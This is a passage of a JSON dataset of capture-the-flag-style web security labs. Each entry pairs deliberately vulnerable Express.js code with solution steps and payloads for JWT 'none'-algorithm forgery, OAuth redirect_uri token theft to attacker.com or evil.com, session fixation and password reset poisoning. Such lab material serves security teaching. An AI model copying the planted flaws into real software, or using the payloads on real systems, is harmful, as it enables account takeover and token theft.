    "https://vulnerable.com/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
    "POST /token with code=authcode123",
    "Authorization: Bearer token-carlos"
  ]
},
{
  "Lab scenario": "JWT None algorithm tampering in Authorization header",
  "Lab Description": "The application uses JWT for authorization, but improperly handles the 'alg' field in tokens. The application accepts JWTs with the 'alg' value set to 'none', leading to signature bypass. To solve: forge a JWT for the admin user and access their protected dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept an authenticated request and extract the JWT token from the Authorization header.",
    "2. Decode the JWT token using jwt.io or Burp Decoder to analyze its payload and algorithm.",
    "3. Modify the 'alg' field to 'none' and change the 'sub' claim to 'admin'. Remove the signature part entirely.",
    "4. Replace the original Authorization header with the modified JWT: 'Authorization: Bearer <forged_token>' using Burp Repeater.",
    "5. Send the request to the protected /admin endpoint and confirm successful access to the admin dashboard."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.sub === 'admin') return res.send('Welcome, admin'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'admin') return res.send('Welcome, admin'); else return res.status(403).send('Forbidden'); } catch { return res.status(400).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration in redirect_uri validation",
  "Lab Description": "The application implements OAuth 2.0 using the implicit grant flow but improperly validates the 'redirect_uri' parameter. This flaw allows redirection-based token theft. To solve: intercept and steal a victim's token by exploiting open redirect behavior.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to spider the app and find an OAuth flow starting with /auth endpoint.",
    "2. Identify that the app uses implicit flow via response_type=token and passes a redirect_uri parameter.",
    "3. Craft a malicious redirect_uri pointing to a domain you control (e.g., https://attacker.com/catch#token).",
    "4. Trick a victim into clicking a login URL with your malicious redirect_uri.",
    "5. Capture the access_token in the fragment part of the redirected URL at attacker.com.",
    "6. Replay the access_token in an Authorization header to access the victim's profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (!client_id || !redirect_uri || response_type !== 'token') return res.status(400).send('Invalid request'); const user = 'carlos'; const accessToken = tokens[user]; res.redirect(`${redirect_uri}#access_token=${accessToken}&token_type=bearer`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; if (token === tokens['carlos']) return res.send('Carlos Profile Page'); res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Implicit Flow Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "https://vulnerable.app/auth?client_id=123&redirect_uri=https://attacker.com/catch&response_type=token",
    "Authorization: Bearer abc123token"
  ]
},
{
  "Lab scenario": "Session fixation via static session identifier in login flow",
  "Lab Description": "The application fails to issue a new session ID after login, making it vulnerable to session fixation. An attacker can set a known session ID before login and force the victim to use it. To solve: hijack Carlos's session by fixing a session ID pre-authentication.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept your own login and observe that the session cookie remains unchanged before and after authentication.",
    "2. Craft a phishing page or email to lure Carlos into logging in while having a pre-set session cookie (e.g., session=attacker123).",
    "3. Set the session cookie manually in Burp Repeater and simulate login as Carlos from the victim side.",
    "4. On the attacker side, send a request using the same fixed session ID: Cookie: session=attacker123.",
    "5. Access Carlos's account page using the hijacked session to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'qwerty123' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; const sess = req.cookies.session || 'anonymous'; if (users[username] === password) { sessions[sess] = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/account', (req, res) => { const sess = req.cookies.session; if (sessions[sess] === 'carlos') res.send('Carlos Account'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Cookie: session=attacker123",
    "POST /login?username=carlos&password=qwerty123",
    "GET /account with Cookie: session=attacker123"
  ]
},
{
  "Lab scenario": "Session Fixation in REST Login Flow",
  "Lab Description": "This lab is vulnerable to session fixation. The application sets a session cookie before authentication and does not issue a new one after login. To solve: hijack Carlos's session using a fixed session ID and access his account dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, send a GET request to /login to receive a session cookie before authentication.",
    "2.Use Burp Repeater to send a crafted login POST request with valid credentials and the pre-issued session ID.",
    "3.Observe that the session ID remains unchanged post-authentication.",
    "4.Share the fixed session ID with Carlos (simulate XSS or phishing scenario) and have him authenticate using it.",
    "5.Use the same fixed session ID to access /dashboard and verify access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixed-session-secret', resave: false, saveUninitialized: true })); app.use(bodyParser.json()); const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { res.send('Login form'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username] === password) { req.session.authenticated = true; req.session.user = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/dashboard', (req, res) => { if (req.session.authenticated) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Forbidden'); } }); app.listen(3000);",
  "payloads": [
    "GET /login",
    "POST /login {\"username\":\"carlos\",\"password\":\"letmein123\"} with session cookie manually set",
    "GET /dashboard with fixed session cookie"
  ]
},
{
  "Lab scenario": "JWT Signature Algorithm Confusion in GraphQL Auth",
  "Lab Description": "This GraphQL-based application uses JWTs for authentication. It accepts 'none' as the JWT algorithm and fails to validate the token signature. To solve: forge a token using 'none' algorithm and access Carlos's profile via a GraphQL query.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Postman to intercept a valid JWT after logging in with any user.",
    "2.Decode the JWT using jwt.io and inspect the 'alg' field.",
    "3.Replace the 'alg' with 'none' and change the payload to impersonate 'carlos'.",
    "4.Remove the signature part and re-encode the header and payload.",
    "5.Send a GraphQL request using the forged token in the Authorization header to access Carlos’s profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'securepass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.post('/graphql', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.replace('Bearer ', ''); try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); return res.send(`Welcome ${payload.user}`); } const verified = jwt.verify(token, 'secret'); res.send(`Welcome ${verified.user}`); } catch { res.status(403).send('Forbidden'); } }); app.listen(4000);",
  "payloads": [
    "JWT with header {\"alg\":\"none\"}",
    "Payload {\"user\":\"carlos\"}",
    "GraphQL POST: {\"query\":\"{ profile { name } }\"} with forged JWT"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
  "Lab Description": "This OAuth integration leaks authorization codes via a poorly validated redirect_uri parameter. To solve: intercept Carlos’s OAuth code via open redirect and exchange it for an access token to view his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Burp Suite to initiate an OAuth login flow and capture the redirect_uri parameter.",
    "2.Modify redirect_uri to point to your controlled domain (use collaborator or custom HTTP server).",
    "3.Phish Carlos into clicking the modified authorization URL.",
    "4.On code interception, exchange the stolen code at the /token endpoint to obtain an access token.",
    "5.Use the token in an API request to GET /api/profile and confirm access to Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id === 'trusted' && response_type === 'code') { const code = 'oauthcode-carlos'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid'); } }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'oauthcode-carlos') { const token = 'access-token-carlos'; tokens[token] = 'carlos'; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (auth && tokens[auth.replace('Bearer ', '')]) { res.send(`Profile: ${tokens[auth.replace('Bearer ', '')]}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(5000);",
  "payloads": [
    "GET /authorize?client_id=trusted&redirect_uri=http://evil.com/capture&response_type=code",
    "Intercepted Code: oauthcode-carlos",
    "POST /token with body {\"code\":\"oauthcode-carlos\"}",
    "GET /api/profile with Authorization: Bearer access-token-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in login endpoint via Cookie Parameter Injection",
  "Lab Description": "The application allows a session identifier to be set via a request cookie prior to authentication. This behavior allows an attacker to fixate a session and hijack the victim's account after they log in. The application accepts and reuses session tokens passed through cookies even before login. To solve: hijack Carlos's session post-login using a fixated session value.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, send a GET /login request with a custom session cookie (e.g., sessionId=attacker123).",
    "2.Log in using your own credentials and observe that the session cookie value persists post-authentication.",
    "3.Log out and craft a phishing link that sets sessionId=attacker123 in the victim’s browser using a Cookie injection or XSS simulation.",
    "4.After the victim logs in using the fixated session ID, capture the same sessionId value from your Burp proxy.",
    "5.Use the sessionId=attacker123 to access /my-account and verify account hijack."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(2); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); sessions[sessionId] = username; res.cookie('sessionId', sessionId); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) res.send(`Welcome ${username}`); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
  "payloads": [
    "Cookie: sessionId=attacker123",
    "Phishing link: <img src='http://vulnerable.site/login' onload='document.cookie=\"sessionId=attacker123\"'>"
  ]
},
{
  "Lab scenario": "JWT Key Confusion via Algorithm Manipulation",
  "Lab Description": "The application uses JWTs for authentication but does not enforce strong algorithm validation, enabling algorithm substitution. The app accepts JWTs signed using 'none' or changes in algorithm headers. To solve: craft a JWT for Carlos without a valid key using the 'none' algorithm and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Burp Suite or Postman to intercept an authenticated request and capture the JWT in Authorization header.",
    "2.Decode the JWT using jwt.io and note the algorithm is set to 'HS256'.",
    "3.Change the algorithm to 'none' and modify the payload to { \"username\": \"carlos\" }.",
    "4.Remove the JWT signature completely, re-encode the token and replace the Authorization header with it.",
    "5.Send the request to /my-account endpoint and verify Carlos's session access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcoded-secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${decoded.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "JWT header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "JWT payload: { \"username\": \"carlos\" }",
    "Authorization: Bearer <unsigned_token>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Token Validation Logic",
  "Lab Description": "The application integrates with an external OAuth provider but does not properly validate the 'aud' claim or client ID. This allows attackers to use a token issued for a different client application to gain access. To solve: obtain an OAuth token from a 3rd-party client and use it to access Carlos's protected account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Postman or OAuth debugger to generate an OAuth token using a public client ID (e.g., demo-client).",
    "2.Inspect the decoded token payload and confirm that the 'sub' or 'email' field is set to carlos@example.com.",
    "3.Send a request to /my-account with the Authorization header set to Bearer <token>.",
    "4.Observe that the server accepts the token despite the incorrect client application, due to weak audience validation.",
    "5.Access protected user data and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.email === 'carlos@example.com') res.send('Carlos Account Accessed'); else res.status(403).send('Access denied'); } catch { res.status(403).send('Invalid token'); } }); app.listen(5000);",
  "payloads": [
    "OAuth token from demo-client with sub: carlos@example.com",
    "Authorization: Bearer <demo-client-token>",
    "Use OAuth2 playground to generate token for public audience"
  ]
},
  {
    "Lab scenario": "Session fixation via unrotated session token post-login",
    "Lab Description": "This lab’s session handling is vulnerable due to the reuse of session tokens across unauthenticated and authenticated states. The application assigns a session token prior to login and does not rotate it after successful authentication. To solve: Hijack Carlos's session after fixation and access his My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate a session with the application using OWASP ZAP to capture the initial Set-Cookie header.",
      "Send the pre-login session cookie to the victim (Carlos) via a simulated phishing email or reflected XSS vector.",
      "Wait for Carlos to authenticate with the fixed session ID (simulate or mock session binding).",
      "Use the same session token in your client to access authenticated resources like /account or /profile.",
      "Confirm session takeover by visiting /my-account and observing Carlos's account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'fixation-key', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/', (req, res) => { if (!req.session.user) { req.session.user = 'guest'; } res.send(`Session active for ${req.session.user}`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send(`Welcome ${username}`); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') { res.send('Carlos account data'); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Set-Cookie: connect.sid=SESSION_ID_HERE",
      "POST /login with hijacked session ID",
      "GET /my-account using fixed session"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm bypass",
    "Lab Description": "This lab uses JWTs for session management but fails to enforce signature validation when the 'alg' header is set to 'none'. The application decodes the JWT without verifying its integrity. To solve: Forge a JWT granting access to Carlos's account and retrieve his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT after logging in using Burp Suite. Decode it using jwt.io or Burp Decoder.",
      "Replace the alg field with 'none' and modify the payload to set username to 'carlos'.",
      "Remove the signature portion of the JWT entirely.",
      "Use Postman to resend a request to /profile with the forged JWT in the Authorization header.",
      "Verify access to Carlos's account page using the manipulated token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtweak' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).send('Invalid'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Profile: ${payload.username}`); }); app.listen(3000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer [forged JWT]"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect as token delivery",
    "Lab Description": "This lab implements OAuth login but misuses the redirect_uri parameter without validation, enabling token leakage via open redirect. To solve: Hijack Carlos's OAuth token using a crafted redirect_uri and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inspect the OAuth flow using Burp Suite by initiating login with OAuth and intercepting the redirect.",
      "Observe the redirect_uri parameter pointing to a callback endpoint.",
      "Modify the redirect_uri to a malicious domain you control (use Burp Collaborator or webhook.site).",
      "Send the malicious login URL to the victim (simulate or script Carlos visiting the link).",
      "Collect the leaked OAuth token from the redirect on your domain and use it in the Authorization header to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = [{ username: 'carlos', token: 'abc123' }]; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = 'abc123'; const uri = `${redirect_uri}?token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.token || req.headers['authorization']; if (token === 'abc123') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "https://vulnerable.site/auth?redirect_uri=https://attacker.com/callback",
      "Captured token: abc123",
      "GET /my-account?token=abc123",
      "Authorization: abc123"
    ]
  },




{
  "Lab scenario": "Session fixation in password reset flow",
  "Lab Description": "The application allows attackers to fix a session identifier before a user resets their password. The password reset handler reuses the existing session without invalidating or rotating it. To solve: hijack Carlos's session by setting a fixed session ID before he resets his password, then access his My account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Using Burp Suite, generate a session cookie via GET /login with no credentials. Note the session ID value.",
    "2. Visit the Forgot Password feature and submit Carlos's username to trigger a reset link.",
    "3. In Burp, intercept the password reset link request. Copy the reset token from your email panel.",
    "4. Open Burp Repeater and send the reset password request with Carlos's reset token but ensure your fixed session ID is used in the Cookie header.",
    "5. After password reset, send a request to /my-account with the same session cookie to access Carlos's account.",
    "6. Confirm lab completion when Carlos's data is shown."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'oldpass' }]; const sessions = {}; const resetTokens = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).slice(2); sessions[sid] = null; res.cookie('sid', sid); res.send('Login page'); }); app.post('/forgot', (req, res) => { const { username } = req.body; const token = Math.random().toString(36).slice(2); resetTokens[username] = token; res.send(`Reset link: /reset-password?token=${token}`); }); app.post('/reset-password', (req, res) => { const { token, newPassword } = req.body; const username = Object.keys(resetTokens).find(k => resetTokens[k] === token); if (username) { const user = users.find(u => u.username === username); user.password = newPassword; const sid = req.cookies.sid; sessions[sid] = username; res.send('Password reset'); } else { res.status(403).send('Invalid token'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username) res.send(`My account: ${username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "GET /login -> retrieve Set-Cookie sid=ABC123",
    "POST /reset-password with Cookie: sid=ABC123",
    "GET /my-account with Cookie: sid=ABC123"
  ]
},
{
  "Lab scenario": "JWT signature bypass using 'none' algorithm in Authorization header",
  "Lab Description": "This app accepts JSON Web Tokens for authentication, but fails to properly validate the algorithm used. The backend trusts the 'alg' field in the JWT header. To solve: craft a JWT with 'none' algorithm to impersonate the admin and access their account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Log in to your own account and capture the JWT token via Burp Suite (Authorization: Bearer ...).",
    "2. Decode the JWT and observe the header and payload. Identify the use of RS256 algorithm.",
    "3. Modify the JWT header to set 'alg' to 'none', remove the signature part, and change payload 'username' to 'admin'.",
    "4. Use Postman to send a GET /my-account request with the forged JWT in the Authorization header.",
    "5. Verify lab completion when admin's account details are returned."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { admin: 'adminpass', user: 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, 'privateKey', { algorithm: 'RS256' }); res.json({ token }); } else res.status(401).send('Unauthorized'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'privateKey', { algorithms: ['RS256'] }); res.send(`Hello ${decoded.username}`); } catch (e) { if (token.split('.').length === 2) { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Hello ${decoded.username}`); } else res.status(403).send('Invalid JWT'); } }); app.listen(4001);",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"admin\" }",
    "JWT: base64(header).base64(payload).<empty signature>"
  ]
},
{
  "Lab scenario": "OAuth access token leakage via referer header in redirect",
  "Lab Description": "The application uses OAuth 2.0 implicit flow and redirects users to a third-party site after authentication. However, the access token is passed in the URL fragment and leaks via the HTTP referer header. To solve: intercept the token leak and use it to access the victim's profile.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use Burp Suite and log in as a normal user. Observe the OAuth redirect request (URL contains #access_token=...).",
    "2. Note that the final redirect is to a third-party endpoint with your token in the Referer header.",
    "3. Simulate a phishing attack where Carlos logs in using a manipulated OAuth redirect_uri that points to your server.",
    "4. On your malicious server, capture the Referer header and extract Carlos's access_token.",
    "5. Replay a request to GET /profile with the stolen token in Authorization: Bearer header.",
    "6. Confirm lab completion when Carlos's profile is shown."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'abc123-carlos-token'; res.redirect(`${redirectUri}#access_token=${accessToken}`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer abc123-carlos-token') res.send('Carlos profile data'); else res.status(403).send('Forbidden'); }); app.listen(4002);",
  "payloads": [
    "Redirect to: /oauth/callback?redirect_uri=http://evil.com/capture",
    "Capture Referer: http://evil.com/capture#access_token=abc123-carlos-token",
    "Replay: GET /profile with Authorization: Bearer abc123-carlos-token"
  ]
},
{
  "Lab scenario": "Session fixation in login flow",
  "Lab Description": "The application fails to properly regenerate session identifiers upon successful login. This allows an attacker to fixate a session ID prior to authentication. The application sets the session cookie before validating credentials and continues using the same session post-login. To solve: hijack Carlos's session using a fixed session ID.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite Proxy to capture an unauthenticated session cookie from a GET /login request.",
    "Use Postman to send a POST /login request with Carlos's credentials while reusing the fixed session cookie.",
    "Verify the session is authenticated and bound to Carlos’s account.",
    "Open the same session in your browser using the fixed session cookie.",
    "Access /my-account and confirm access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret!', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') res.send('Welcome Carlos'); else res.send('Access denied'); }); app.listen(3000);",
  "payloads": [
    "GET /login -> extract session id",
    "POST /login with fixed session id and carlos:letmein",
    "Inject session cookie into browser: session=known_value"
  ]
},
{
  "Lab scenario": "JWT authentication bypass via none algorithm",
  "Lab Description": "The application uses JWTs for authentication, but fails to enforce algorithm restrictions during signature verification. This allows an attacker to craft a forged token by changing the algorithm to 'none'. To solve: forge a valid token for user carlos and access the admin panel.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Capture a JWT after login using Burp Suite.",
    "Decode the JWT in jwt.io and modify the payload: {\"username\":\"carlos\"}.",
    "Set the header to {\"alg\":\"none\"} and remove the signature.",
    "Send the forged token via Postman in the Authorization header: Bearer <jwt>.",
    "Verify access to /admin-panel as user carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'topsecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 's3cr3t') { const token = jwt.sign({ username }, secret); res.json({ token }); } else { res.status(403).send('Invalid'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') res.send('Welcome to admin panel'); else res.send('Access denied'); } catch { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
  "payloads": [
    "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer <forged-token>",
    "Use jwt.io to forge token without signature"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect URI",
  "Lab Description": "The application integrates a third-party OAuth provider but does not strictly validate redirect URIs. An attacker can manipulate the redirect URI to capture access tokens. To solve: intercept Carlos’s OAuth access token and access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept OAuth authorization request during login.",
    "Modify the redirect_uri parameter to a domain you control (e.g., https://attacker.com/callback).",
    "Send the modified request and log in as Carlos when prompted by the OAuth provider.",
    "Capture the access token sent to your server.",
    "Use Postman to send a GET /profile request with Authorization: Bearer <captured_token>."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const state = req.query.state; res.redirect(`${redirectUri}#access_token=mocktokenforcarlos&state=${state}`); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'mocktokenforcarlos') res.send('Carlos Profile Data'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
  "payloads": [
    "redirect_uri=https://attacker.com/callback",
    "Captured token: mocktokenforcarlos",
    "Authorization: Bearer mocktokenforcarlos"
  ]
},
{
  "Lab scenario": "JWT Authentication Bypass via Unverified Signature in Session Token",
  "Lab Description": "The application uses JWTs for session management but fails to verify the token's signature. This oversight allows attackers to forge tokens with arbitrary payloads. The application grants access based solely on the 'sub' claim without validating the token's integrity. To solve: Modify your JWT to impersonate the 'administrator' user and delete Carlos's account via the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept the JWT after logging in using Burp Suite.",
    "Decode the JWT payload and change the 'sub' claim to 'administrator'.",
    "Remove the signature part of the JWT or replace it with a dummy value.",
    "Re-encode the JWT and replace the session cookie with the modified token.",
    "Access the /admin/delete?username=carlos endpoint to delete Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const users = ['wiener', 'carlos', 'administrator']; app.get('/admin/delete', (req, res) => { const token = req.cookies.session; const payload = jwt.decode(token); if (payload.sub !== 'administrator') return res.status(403).send('Access denied'); const userToDelete = req.query.username; if (users.includes(userToDelete)) { users.splice(users.indexOf(userToDelete), 1); res.send(`User ${userToDelete} deleted`); } else { res.status(404).send('User not found'); } }); app.listen(3000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.",
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.dummy_signature"
  ]
},
{
  "Lab scenario": "Password Reset Poisoning via Middleware in HTTP Headers",
  "Lab Description": "The application constructs password reset links using the 'X-Forwarded-Host' header without proper validation. This allows attackers to manipulate the reset link sent to users. The application trusts the header value to generate the reset URL. To solve: Poison the password reset link to redirect to your server, capture Carlos's reset token, and reset his password.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate a password reset for Carlos and intercept the request using Burp Suite.",
